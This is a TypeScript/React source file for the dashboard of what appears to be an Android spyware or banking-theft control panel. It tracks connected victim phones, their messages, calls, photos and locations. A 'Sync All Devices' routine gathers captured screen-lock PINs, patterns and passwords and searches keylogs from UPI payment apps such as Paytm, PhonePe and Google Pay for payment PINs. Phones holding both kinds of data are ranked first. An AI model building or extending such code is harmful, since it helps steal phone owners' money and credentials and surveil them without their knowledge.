'use client';

import { useEffect, useState, useCallback, Suspense } from 'react';
import Sidebar from '@/components/layout/Sidebar';
import Header from '@/components/layout/Header';
import DeviceCard from '@/components/devices/DeviceCard';
import { getDevices, refreshRealtimeStatus, getUnlocks, getKeylogs } from '@/lib/api';
import { useDevicesStore, useAuthStore } from '@/lib/store';
import { connectSocket } from '@/lib/socket';
import { subscribeToDeviceStatuses } from '@/lib/firebase';
import {
  Smartphone,
  Globe,
  MessageSquare,
  Camera,
  Zap,
  Star,
  Wifi,
  WifiOff,
  ChevronDown,
  ChevronRight,
  Shield,
  Activity,
  TrendingUp,
  Clock,
  Bell,
  Search,
  Filter,
  LayoutGrid,
  List,
  Sparkles,
  RefreshCw,
  X,
  Lock,
  Key,
  Hash,
} from 'lucide-react';
import { useRouter } from 'next/navigation';

interface EnhancedDevice {
  id: string;
  deviceId: string;
  model?: string;
  manufacturer?: string;
  androidVersion?: string;
  isOnline: boolean;
  lastSeen: string;
  latestLocation?: { latitude: number; longitude: number };
  stats?: { sms: number; calls: number; screenshots: number; photos: number };
  isPinned?: boolean;
  remark?: string;
  owner?: { id: string; username: string };
  // Sync data - updated when user clicks Sync All
  syncData?: {
    hasLockData: boolean;
    hasUpiData: boolean;
    unlockCount: number;
    patternCount: number;
    upiPinsCount: number;
    capturedUpiApps: string[];  // List of UPI app names with captured data
    lockDetails: { type: string; count: number }[];  // Lock data breakdown
  };
}

export default function Dashboard() {
  return (
    <Suspense fallback={<DashboardSkeleton />}>
      <DashboardContent />
    </Suspense>
  );
}

function DashboardSkeleton() {
  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900/20 to-slate-900">
      <div className="flex items-center justify-center min-h-screen">
        <div className="flex flex-col items-center gap-4">
          <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-violet-500 to-purple-600 flex items-center justify-center animate-pulse">
            <Shield className="w-8 h-8 text-white" />
          </div>
          <div className="h-2 w-32 bg-white/10 rounded-full overflow-hidden">
            <div className="h-full w-1/2 bg-gradient-to-r from-violet-500 to-purple-500 rounded-full animate-pulse" />
          </div>
        </div>
      </div>
    </div>
  );
}

function DashboardContent() {
  const router = useRouter();
  const { isAuthenticated, isHydrated, user } = useAuthStore();
  const { devices, setDevices, updateDevice } = useDevicesStore();
  const [loading, setLoading] = useState(true);
  const [enhancedDevices, setEnhancedDevices] = useState<EnhancedDevice[]>([]);
  const [aggregateStats, setAggregateStats] = useState({
    totalSms: 0,
    totalPhotos: 0,
    totalCalls: 0,
  });

  // UI States
  const [viewMode, setViewMode] = useState<'grid' | 'list'>('grid');
  const [searchQuery, setSearchQuery] = useState('');
  const [expandedSections, setExpandedSections] = useState({
    pinned: true,
    online: true,
    offline: false,
  });

  // Sync All Devices State
  const [syncModalOpen, setSyncModalOpen] = useState(false);
  const [syncing, setSyncing] = useState(false);
  const [syncResults, setSyncResults] = useState<{
    deviceId: string;
    model: string;
    manufacturer: string;
    unlockCount: number;
    patternCount: number;
    upiPinsCount: number;
    hasLockData: boolean;
    hasUpiData: boolean;
    capturedUpiApps: string[];
    lockDetails: { type: string; count: number }[];
  }[]>([]);

  // Pinned devices state
  const [pinnedDeviceIds, setPinnedDeviceIds] = useState<Set<string>>(new Set());

  useEffect(() => {
    if (isHydrated && !isAuthenticated) {
      router.push('/login');
    }
  }, [isHydrated, isAuthenticated, router]);

  // Load pinned devices from localStorage
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const stored = localStorage.getItem('pinned_devices');
      if (stored) {
        try {
          setPinnedDeviceIds(new Set(JSON.parse(stored)));
        } catch (e) {
          console.error('Failed to parse pinned devices:', e);
        }
      }
    }
  }, []);

  const savePinnedDevices = useCallback((ids: Set<string>) => {
    if (typeof window !== 'undefined') {
      localStorage.setItem('pinned_devices', JSON.stringify([...ids]));
    }
  }, []);

  const fetchDevices = useCallback(async () => {
    try {
      setLoading(true);
      await refreshRealtimeStatus().catch(() => { });
      const data = await getDevices();
      if (data.success) {
        setDevices(data.devices);

        const devicesWithPinned: EnhancedDevice[] = data.devices.map((device: any) => ({
          ...device,
          isPinned: pinnedDeviceIds.has(device.deviceId),
        }));

        setEnhancedDevices(devicesWithPinned);

        const totalSms = data.devices.reduce((sum: number, d: any) => sum + (d.stats?.sms || 0), 0);
        const totalPhotos = data.devices.reduce((sum: number, d: any) => sum + (d.stats?.photos || 0) + (d.stats?.screenshots || 0), 0);
        const totalCalls = data.devices.reduce((sum: number, d: any) => sum + (d.stats?.calls || 0), 0);
        setAggregateStats({ totalSms, totalPhotos, totalCalls });
      }
    } catch (error) {
      console.error('Failed to fetch devices:', error);
    } finally {
      setLoading(false);
    }
  }, [setDevices, pinnedDeviceIds]);

  useEffect(() => {
    if (isAuthenticated) {
      fetchDevices();
      const socket = connectSocket();

      socket.on('device:online', (data) => {
        updateDevice(data.deviceId, { isOnline: true });
        setEnhancedDevices(prev =>
          prev.map(d => d.deviceId === data.deviceId ? { ...d, isOnline: true } : d)
        );
      });
      socket.on('device:offline', (data) => {
        updateDevice(data.deviceId, { isOnline: false });
        setEnhancedDevices(prev =>
          prev.map(d => d.deviceId === data.deviceId ? { ...d, isOnline: false } : d)
        );
      });

      const unsubscribeFirebase = subscribeToDeviceStatuses((statusMap) => {
        setEnhancedDevices(prev =>
          prev.map(d => {
            const status = statusMap.get(d.deviceId);
            if (status !== undefined) {
              return { ...d, isOnline: status.online };
            }
            return d;
          })
        );
        statusMap.forEach((status, deviceId) => updateDevice(deviceId, { isOnline: status.online }));
      });

      return () => {
        socket.off('device:online');
        socket.off('device:offline');
        unsubscribeFirebase();
      };
    }
  }, [isAuthenticated, fetchDevices, updateDevice]);

  useEffect(() => {
    setEnhancedDevices(prev =>
      prev.map(ed => {
        const updated = devices.find(d => d.deviceId === ed.deviceId);
        return updated ? { ...ed, ...updated, isPinned: pinnedDeviceIds.has(ed.deviceId) } : ed;
      })
    );
  }, [devices, pinnedDeviceIds]);

  const handlePinToggle = useCallback((deviceId: string, isPinned: boolean) => {
    setPinnedDeviceIds(prev => {
      const newSet = new Set(prev);
      if (isPinned) {
        newSet.add(deviceId);
      } else {
        newSet.delete(deviceId);
      }
      savePinnedDevices(newSet);
      return newSet;
    });

    setEnhancedDevices(prev =>
      prev.map(d => d.deviceId === deviceId ? { ...d, isPinned } : d)
    );
  }, [savePinnedDevices]);

  const toggleSection = (section: 'pinned' | 'online' | 'offline') => {
    setExpandedSections(prev => ({ ...prev, [section]: !prev[section] }));
  };

  // UPI package names for detecting payment app pins
  const UPI_PACKAGES = [
    'net.one97.paytm', 'com.phonepe.app', 'com.google.android.apps.nbu.paisa.user',
    'in.org.npci.upiapp', 'in.amazon.mShop.android.shopping', 'com.whatsapp',
    'com.dreamplug.androidapp', 'com.freecharge.android', 'com.mobikwik_new',
    'com.csam.icici.bank.imobile', 'com.sbi.upi', 'in.gov.umang.negd.g2c',
  ];

  // Handle Sync All Online Devices
  const handleSyncAllDevices = useCallback(async () => {
    setSyncing(true);
    setSyncModalOpen(true);
    setSyncResults([]);

    const onlineDevicesList = enhancedDevices.filter(d => d.isOnline);
    const results: typeof syncResults = [];

    for (const device of onlineDevicesList) {
      try {
        // Fetch unlock attempts
        const unlocksRes = await getUnlocks(device.id);
        const unlocks = unlocksRes?.data || [];

        // Fetch keylogs to check for UPI pins
        const keylogsRes = await getKeylogs(device.id, 1, 500);
        const keylogs = keylogsRes?.data || [];

        // Count different types
        const pinUnlocks = unlocks.filter((u: any) => u.unlockType === 'pin');
        const patternUnlocks = unlocks.filter((u: any) => u.unlockType === 'pattern');

        // Check for UPI app keylogs and collect unique app names
        const upiAppSet = new Set<string>();
        const upiKeylogs = keylogs.filter((k: any) => {
          const matchedPkg = UPI_PACKAGES.find(pkg => k.app?.includes(pkg));
          if (matchedPkg) {
            // Get friendly name from known packages or use app name
            const friendlyNames: { [key: string]: string } = {
              'net.one97.paytm': 'Paytm',
              'com.phonepe.app': 'PhonePe',
              'com.google.android.apps.nbu.paisa.user': 'Google Pay',
              'in.org.npci.upiapp': 'BHIM',
              'in.amazon.mShop.android.shopping': 'Amazon Pay',
              'com.whatsapp': 'WhatsApp',
              'com.dreamplug.androidapp': 'CRED',
              'com.freecharge.android': 'Freecharge',
              'com.mobikwik_new': 'MobiKwik',
              'com.csam.icici.bank.imobile': 'iMobile',
              'com.sbi.upi': 'SBI UPI',
            };
            upiAppSet.add(friendlyNames[matchedPkg] || k.appName || matchedPkg);
            return true;
          }
          if (k.appName?.toLowerCase().includes('pay') || k.appName?.toLowerCase().includes('upi')) {
            upiAppSet.add(k.appName);
            return true;
          }
          return false;
        });

        // Build lock details breakdown
        const lockDetails: { type: string; count: number }[] = [];
        if (pinUnlocks.length > 0) lockDetails.push({ type: 'PINs', count: pinUnlocks.length });
        if (patternUnlocks.length > 0) lockDetails.push({ type: 'Patterns', count: patternUnlocks.length });
        const passwordUnlocks = unlocks.filter((u: any) => u.unlockType === 'password');
        if (passwordUnlocks.length > 0) lockDetails.push({ type: 'Passwords', count: passwordUnlocks.length });

        results.push({
          deviceId: device.deviceId,
          model: device.model || 'Unknown',
          manufacturer: device.manufacturer || 'Unknown',
          unlockCount: pinUnlocks.length,
          patternCount: patternUnlocks.length,
          upiPinsCount: upiKeylogs.length,
          hasLockData: unlocks.length > 0,
          hasUpiData: upiKeylogs.length > 0,
          capturedUpiApps: Array.from(upiAppSet),
          lockDetails,
        });
      } catch (err) {
        console.error(`Failed to sync device ${device.deviceId}:`, err);
        results.push({
          deviceId: device.deviceId,
          model: device.model || 'Unknown',
          manufacturer: device.manufacturer || 'Unknown',
          unlockCount: 0,
          patternCount: 0,
          upiPinsCount: 0,
          hasLockData: false,
          hasUpiData: false,
          capturedUpiApps: [],
          lockDetails: [],
        });
      }
    }

    setSyncResults(results);
    setSyncing(false);

    // Persist sync data to enhancedDevices for showing badges on device cards
    setEnhancedDevices(prev => prev.map(device => {
      const syncResult = results.find(r => r.deviceId === device.deviceId);
      if (syncResult) {
        return {
          ...device,
          syncData: {
            hasLockData: syncResult.hasLockData,
            hasUpiData: syncResult.hasUpiData,
            unlockCount: syncResult.unlockCount,
            patternCount: syncResult.patternCount,
            upiPinsCount: syncResult.upiPinsCount,
            capturedUpiApps: syncResult.capturedUpiApps,
            lockDetails: syncResult.lockDetails,
          }
        };
      }
      return device;
    }));
  }, [enhancedDevices]);

  if (!isHydrated || !isAuthenticated) return null;

  // Filter devices by search
  const filteredDevices = enhancedDevices.filter(d =>
    !searchQuery ||
    d.model?.toLowerCase().includes(searchQuery.toLowerCase()) ||
    d.manufacturer?.toLowerCase().includes(searchQuery.toLowerCase()) ||
    d.deviceId.toLowerCase().includes(searchQuery.toLowerCase())
  );

  // Categorize devices - all with stable sort by deviceId
  const pinnedDevices = filteredDevices
    .filter(d => pinnedDeviceIds.has(d.deviceId))
    .sort((a, b) => a.deviceId.localeCompare(b.deviceId));
  const onlineDevices = filteredDevices
    .filter(d => d.isOnline && !pinnedDeviceIds.has(d.deviceId))
    .sort((a, b) => {
      // Sort by sync data: Both > UPI > Lock > Neither
      // Use deviceId as secondary key for STABLE sorting (prevents shuffling)
      const getPriority = (d: typeof a) => {
        if (d.syncData?.hasUpiData && d.syncData?.hasLockData) return 1;
        if (d.syncData?.hasUpiData) return 2;
        if (d.syncData?.hasLockData) return 3;
        return 4;
      };
      const priorityDiff = getPriority(a) - getPriority(b);
      // If same priority, sort by deviceId for consistent ordering
      if (priorityDiff !== 0) return priorityDiff;
      return a.deviceId.localeCompare(b.deviceId);
    });
  // Sort offline devices by deviceId for stable ordering
  const offlineDevices = filteredDevices
    .filter(d => !d.isOnline && !pinnedDeviceIds.has(d.deviceId))
    .sort((a, b) => a.deviceId.localeCompare(b.deviceId));

  const totalCount = enhancedDevices.length;
  const onlineCount = enhancedDevices.filter(d => d.isOnline).length;

  const statsCards = [
    {
      label: 'Total Devices',
      value: totalCount,
      icon: Smartphone,
      gradient: 'from-violet-500 via-purple-500 to-fuchsia-500',
      bgGlow: 'rgba(139, 92, 246, 0.15)',
    },
    {
      label: 'Online Now',
      value: onlineCount,
      icon: Activity,
      gradient: 'from-emerald-400 via-green-500 to-teal-500',
      bgGlow: 'rgba(16, 185, 129, 0.15)',
      live: true,
    },
    {
      label: 'Messages',
      value: aggregateStats.totalSms.toLocaleString(),
      icon: MessageSquare,
      gradient: 'from-blue-400 via-cyan-500 to-teal-400',
      bgGlow: 'rgba(59, 130, 246, 0.15)',
    },
    {
      label: 'Media Files',
      value: aggregateStats.totalPhotos.toLocaleString(),
      icon: Camera,
      gradient: 'from-orange-400 via-amber-500 to-yellow-500',
      bgGlow: 'rgba(245, 158, 11, 0.15)',
    },
  ];

  return (
    <div className="min-h-screen bg-[var(--bg-base)] pb-24 lg:pb-0">
      <Sidebar />
      <main className="lg:ml-72">
        <Header title="Dashboard" subtitle="Device monitoring & control center" onRefresh={fetchDevices} />

        <div className="p-4 lg:px-8 lg:py-6 lg:max-w-7xl lg:mx-auto space-y-6">

          {/* Welcome Banner - Compact */}
          <div className="relative overflow-hidden rounded-2xl bg-gradient-to-r from-violet-600 via-purple-600 to-fuchsia-600 p-4 lg:p-8">
            <div className="relative z-10 flex flex-col lg:flex-row lg:items-center lg:justify-between gap-3">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 lg:w-12 lg:h-12 rounded-xl bg-white/20 backdrop-blur-sm flex items-center justify-center">
                  <Shield className="w-5 h-5 lg:w-6 lg:h-6 text-white" />
                </div>
                <div>
                  <h1 className="text-lg lg:text-2xl font-bold text-white leading-tight">
                    Welcome back{user?.username ? `, ${user.username}` : ''}! 👋
                  </h1>
                  <p className="text-white/70 text-[11px] lg:text-sm">
                    {onlineCount} of {totalCount} devices online
                  </p>
                </div>
              </div>

              <div className="flex items-center">
                <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-white/10 backdrop-blur-sm border border-white/20">
                  <div className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                  <span className="text-white text-[10px] lg:text-sm font-medium tracking-tight">Live Monitoring</span>
                </div>
              </div>
            </div>
          </div>

          {/* Stats Grid - Compact */}
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 lg:gap-4">
            {statsCards.map((stat, i) => {
              const Icon = stat.icon;
              return (
                <div
                  key={stat.label}
                  className="group relative bg-white rounded-2xl lg:rounded-3xl p-3.5 lg:p-6 border border-[var(--border-light)] shadow-sm hover:shadow-xl hover:-translate-y-1 transition-all duration-300 overflow-hidden"
                  style={{ boxShadow: `0 4px 16px ${stat.bgGlow}` }}
                >
                  <div className={`absolute top-0 left-0 right-0 h-1 bg-gradient-to-r ${stat.gradient}`} />
                  <div className="relative">
                    <div className="flex items-start justify-between mb-3 lg:mb-4">
                      <div className={`w-10 h-10 lg:w-12 lg:h-12 rounded-xl bg-gradient-to-br ${stat.gradient} flex items-center justify-center shadow-lg shadow-purple-500/10 ${loading ? 'animate-pulse opacity-70' : ''}`}>
                        <Icon className="w-5 h-5 lg:w-6 lg:h-6 text-white" />
                      </div>
                      {stat.live && !loading && (
                        <div className="flex items-center gap-1 px-2 py-0.5 rounded-full bg-emerald-500/10 border border-emerald-500/20">
                          <span className="relative flex h-1.5 w-1.5">
                            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                            <span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-emerald-500"></span>
                          </span>
                          <span className="text-[9px] font-bold text-emerald-600 uppercase">Live</span>
                        </div>
                      )}
                    </div>

                    <div>
                      {loading ? (
                        <div className="h-8 lg:h-10 w-24 bg-slate-100 rounded-lg animate-pulse mb-2" />
                      ) : (
                        <p className="text-2xl lg:text-4xl font-extrabold text-[var(--text-primary)] tracking-tight">
                          {stat.value}
                        </p>
                      )}
                      <p className="text-[11px] lg:text-sm font-medium text-[var(--text-muted)] mt-0.5">
                        {stat.label}
                      </p>
                    </div>
                  </div>
                </div>
              );
            })}
          </div>

          {/* Search and Filter Bar */}
          <div className="flex flex-col sm:flex-row gap-3">
            <div className="flex-1 relative">
              <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-[var(--text-muted)]" />
              <input
                type="text"
                placeholder="Search devices by name, model, or ID..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="w-full pl-12 pr-4 py-3 bg-white border border-[var(--border-light)] rounded-xl text-[var(--text-primary)] placeholder:text-[var(--text-muted)] focus:outline-none focus:ring-2 focus:ring-[var(--primary)]/20 focus:border-[var(--primary)] transition-all"
              />
            </div>
            <div className="flex gap-2">
              <button
                onClick={() => setViewMode('grid')}
                className={`p-3 rounded-xl border transition-all ${viewMode === 'grid'
                  ? 'bg-[var(--primary)] border-[var(--primary)] text-white'
                  : 'bg-white border-[var(--border-light)] text-[var(--text-muted)] hover:border-[var(--primary)]'
                  }`}
              >
                <LayoutGrid className="w-5 h-5" />
              </button>
              <button
                onClick={() => setViewMode('list')}
                className={`p-3 rounded-xl border transition-all ${viewMode === 'list'
                  ? 'bg-[var(--primary)] border-[var(--primary)] text-white'
                  : 'bg-white border-[var(--border-light)] text-[var(--text-muted)] hover:border-[var(--primary)]'
                  }`}
              >
                <List className="w-5 h-5" />
              </button>
            </div>
          </div>

          {/* Device Sections */}
          {loading ? (
            <div className="space-y-4">
              {[1, 2, 3].map((i) => (
                <div key={i} className="h-48 rounded-2xl bg-white/50 animate-pulse" />
              ))}
            </div>
          ) : filteredDevices.length === 0 ? (
            <div className="bg-white rounded-2xl p-6 lg:p-12 text-center border border-[var(--border-light)]">
              <div className="w-16 h-16 lg:w-20 lg:h-20 mx-auto mb-4 lg:mb-6 rounded-2xl bg-gradient-to-br from-violet-500/10 to-purple-500/10 flex items-center justify-center">
                <Smartphone className="w-8 h-8 lg:w-10 lg:h-10 text-[var(--primary)]" />
              </div>
              <h3 className="font-bold text-lg lg:text-xl text-[var(--text-primary)] mb-2">
                {searchQuery ? 'No devices found' : 'No Devices Connected'}
              </h3>
              <p className="text-[var(--text-muted)] mb-6 max-w-md mx-auto">
                {searchQuery
                  ? `No devices match "${searchQuery}". Try a different search term.`
                  : 'Install the monitoring app on a device to get started with real-time tracking.'}
              </p>
              {!searchQuery && (
                <div className="inline-flex items-center gap-2 px-5 py-3 rounded-xl bg-gradient-to-r from-violet-500 to-purple-600 text-white font-medium shadow-lg shadow-purple-500/25">
                  <Sparkles className="w-5 h-5" />
                  <span>Waiting for connections...</span>
                </div>
              )}
            </div>
          ) : (
            <div className="space-y-12 pb-20">
              {/* Pinned Devices */}
              {pinnedDevices.length > 0 && (
                <DeviceSection
                  title="Pinned Devices"
                  count={pinnedDevices.length}
                  icon={Star}
                  gradient="from-amber-500 to-orange-500"
                  expanded={expandedSections.pinned}
                  onToggle={() => toggleSection('pinned')}
                  devices={pinnedDevices}
                  viewMode={viewMode}
                  onPinToggle={handlePinToggle}
                />
              )}

              {/* Sync All Devices Button */}
              <div className="flex items-center justify-between px-2 py-4">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-fuchsia-500 to-purple-600 flex items-center justify-center shadow-lg">
                    <RefreshCw className="w-5 h-5 text-white" />
                  </div>
                  <div>
                    <h3 className="text-sm font-bold text-[var(--text-primary)]">Quick Sync</h3>
                    <p className="text-[10px] text-[var(--text-muted)]">Check captured pins for all online devices</p>
                  </div>
                </div>
                <button
                  onClick={handleSyncAllDevices}
                  disabled={syncing}
                  className="flex items-center gap-2 px-4 py-2.5 rounded-xl bg-gradient-to-r from-fuchsia-500 to-purple-600 text-white font-medium text-sm shadow-lg hover:shadow-xl transition-all duration-300 disabled:opacity-50"
                >
                  <RefreshCw className={`w-4 h-4 ${syncing ? 'animate-spin' : ''}`} />
                  {syncing ? 'Syncing...' : 'Sync All Devices'}
                </button>
              </div>

              {/* Sync Results Modal */}
              {syncModalOpen && (
                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
                  <div className="bg-white rounded-2xl shadow-2xl w-[90%] max-w-2xl max-h-[80vh] overflow-hidden">
                    <div className="flex items-center justify-between p-4 border-b bg-gradient-to-r from-fuchsia-500 to-purple-600">
                      <div className="flex items-center gap-3">
                        <RefreshCw className={`w-5 h-5 text-white ${syncing ? 'animate-spin' : ''}`} />
                        <h2 className="text-lg font-bold text-white">
                          {syncing ? 'Syncing All Devices...' : 'Sync Results'}
                        </h2>
                      </div>
                      <button
                        onClick={() => setSyncModalOpen(false)}
                        className="p-2 rounded-lg hover:bg-white/20 transition-colors"
                      >
                        <X className="w-5 h-5 text-white" />
                      </button>
                    </div>

                    <div className="p-4 overflow-y-auto max-h-[60vh]">
                      {syncing ? (
                        <div className="flex flex-col items-center justify-center py-12">
                          <div className="w-16 h-16 rounded-full border-4 border-purple-500 border-t-transparent animate-spin mb-4" />
                          <p className="text-[var(--text-muted)]">Fetching data from all online devices...</p>
                        </div>
                      ) : syncResults.length === 0 ? (
                        <div className="text-center py-12">
                          <p className="text-[var(--text-muted)]">No online devices found</p>
                        </div>
                      ) : (
                        <div className="space-y-3">
                          {[...syncResults]
                            .sort((a, b) => {
                              // Priority: 1=Both, 2=UPI only, 3=Lock only, 4=Neither
                              const getPriority = (r: typeof a) => {
                                if (r.hasUpiData && r.hasLockData) return 1;
                                if (r.hasUpiData) return 2;
                                if (r.hasLockData) return 3;
                                return 4;
                              };
                              return getPriority(a) - getPriority(b);
                            })
                            .map((result) => (
                              <div
                                key={result.deviceId}
                                className="p-4 rounded-xl border border-slate-200 hover:border-purple-300 transition-colors"
                              >
                                <div className="flex items-center justify-between">
                                  <div>
                                    <h3 className="font-semibold text-[var(--text-primary)]">
                                      {result.manufacturer} {result.model}
                                    </h3>
                                    <p className="text-xs text-[var(--text-muted)]">{result.deviceId.slice(0, 20)}...</p>
                                  </div>
                                  <div className="flex items-center gap-2">
                                    {result.hasLockData && (
                                      <span className="flex items-center gap-1 px-2 py-1 rounded-full bg-emerald-100 text-emerald-700 text-xs font-medium">
                                        <Lock className="w-3 h-3" />
                                        Screen Lock
                                      </span>
                                    )}
                                    {result.hasUpiData && (
                                      <span className="flex items-center gap-1 px-2 py-1 rounded-full bg-orange-100 text-orange-700 text-xs font-medium">
                                        <Key className="w-3 h-3" />
                                        UPI Pins
                                      </span>
                                    )}
                                  </div>
                                </div>

                                <div className="mt-3 flex items-center gap-4 text-sm">
                                  <div className="flex items-center gap-1.5">
                                    <Hash className="w-4 h-4 text-blue-500" />
                                    <span className="text-[var(--text-muted)]">PINs:</span>
                                    <span className="font-semibold text-[var(--text-primary)]">{result.unlockCount}</span>
                                  </div>
                                  <div className="flex items-center gap-1.5">
                                    <Lock className="w-4 h-4 text-purple-500" />
                                    <span className="text-[var(--text-muted)]">Patterns:</span>
                                    <span className="font-semibold text-[var(--text-primary)]">{result.patternCount}</span>
                                  </div>
                                  <div className="flex items-center gap-1.5">
                                    <Key className="w-4 h-4 text-orange-500" />
                                    <span className="text-[var(--text-muted)]">UPI:</span>
                                    <span className="font-semibold text-[var(--text-primary)]">{result.upiPinsCount}</span>
                                  </div>
                                </div>
                              </div>
                            ))}
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}

              {/* Online Devices */}
              <DeviceSection
                title="Online Devices"
                count={onlineDevices.length}
                icon={Wifi}
                gradient="from-emerald-500 to-teal-500"
                expanded={expandedSections.online}
                onToggle={() => toggleSection('online')}
                devices={onlineDevices}
                viewMode={viewMode}
                onPinToggle={handlePinToggle}
                live={onlineDevices.length > 0}
                emptyMessage="No devices currently online"
                emptyIcon={WifiOff}
              />

              {/* Offline Devices */}
              <DeviceSection
                title="Offline Devices"
                count={offlineDevices.length}
                icon={WifiOff}
                gradient="from-slate-400 to-gray-500"
                expanded={expandedSections.offline}
                onToggle={() => toggleSection('offline')}
                devices={offlineDevices}
                viewMode={viewMode}
                onPinToggle={handlePinToggle}
                emptyMessage="All devices are currently online!"
                emptyIcon={Wifi}
              />
            </div>
          )}
        </div>
      </main>
    </div>
  );
}

// Device Section Component
function DeviceSection({
  title,
  count,
  icon: Icon,
  gradient,
  expanded,
  onToggle,
  devices,
  viewMode,
  onPinToggle,
  live = false,
  emptyMessage,
  emptyIcon: EmptyIcon,
}: {
  title: string;
  count: number;
  icon: any;
  gradient: string;
  expanded: boolean;
  onToggle: () => void;
  devices: EnhancedDevice[];
  viewMode: 'grid' | 'list';
  onPinToggle: (deviceId: string, isPinned: boolean) => void;
  live?: boolean;
  emptyMessage?: string;
  emptyIcon?: any;
}) {
  return (
    <div className="space-y-6">
      {/* Section Header as a Label */}
      <div className="flex items-center justify-between px-2">
        <div className="flex items-center gap-4">
          <div className={`w-1.5 h-8 rounded-full bg-gradient-to-b ${gradient} shadow-sm shadow-black/5`} />
          <div className="text-left">
            <div className="flex items-center gap-2">
              <h2 className="text-lg lg:text-xl font-bold text-[var(--text-primary)] tracking-tight">{title}</h2>
              {live && (
                <span className="flex items-center gap-1.5 px-2 py-0.5 rounded-full bg-emerald-500/10 text-emerald-600 text-[10px] font-black uppercase tracking-wider">
                  <span className="relative flex h-1.5 w-1.5">
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                    <span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-emerald-500"></span>
                  </span>
                  Live
                </span>
              )}
            </div>
            <p className="text-[10px] lg:text-xs font-black text-[var(--text-muted)] uppercase tracking-[0.1em] opacity-80">
              {count} Device{count !== 1 ? 's' : ''} Connected
            </p>
          </div>
        </div>

        <button
          onClick={onToggle}
          className={`group flex items-center gap-2 px-4 py-2 rounded-xl transition-all duration-300 border ${expanded
            ? 'bg-slate-900 border-slate-900 text-white shadow-lg shadow-slate-900/10'
            : 'bg-white border-slate-200 text-slate-500 hover:border-slate-300 hover:text-slate-900'
            }`}
        >
          <span className="text-xs font-bold uppercase tracking-widest hidden sm:inline">
            {expanded ? 'Hide List' : 'Show List'}
          </span>
          <div className={`transition-transform duration-300 ${expanded ? 'rotate-180' : ''}`}>
            <ChevronDown className="w-4 h-4" />
          </div>
        </button>
      </div>

      {/* Section Content */}
      {expanded && (
        <div className="transition-all duration-500 animate-slide-up">
          {devices.length > 0 ? (
            <div className={viewMode === 'grid'
              ? 'grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4 lg:gap-6'
              : 'space-y-3'
            }>
              {devices.map((device) => (
                <DeviceCard
                  key={device.id}
                  device={device}
                  showPin={true}
                  showRemark={true}
                  onPinToggle={onPinToggle}
                  compact={viewMode === 'list'}
                />
              ))}
            </div>
          ) : emptyMessage && EmptyIcon ? (
            <div className="bg-white/40 rounded-[2rem] border border-dashed border-slate-200 py-12 text-center">
              <div className="w-16 h-16 mx-auto mb-4 rounded-2xl bg-slate-50 flex items-center justify-center text-slate-300">
                <EmptyIcon className="w-8 h-8 opacity-50" />
              </div>
              <p className="text-sm font-medium text-slate-500">{emptyMessage}</p>
            </div>
          ) : null}
        </div>
      )}
    </div>
  );
}
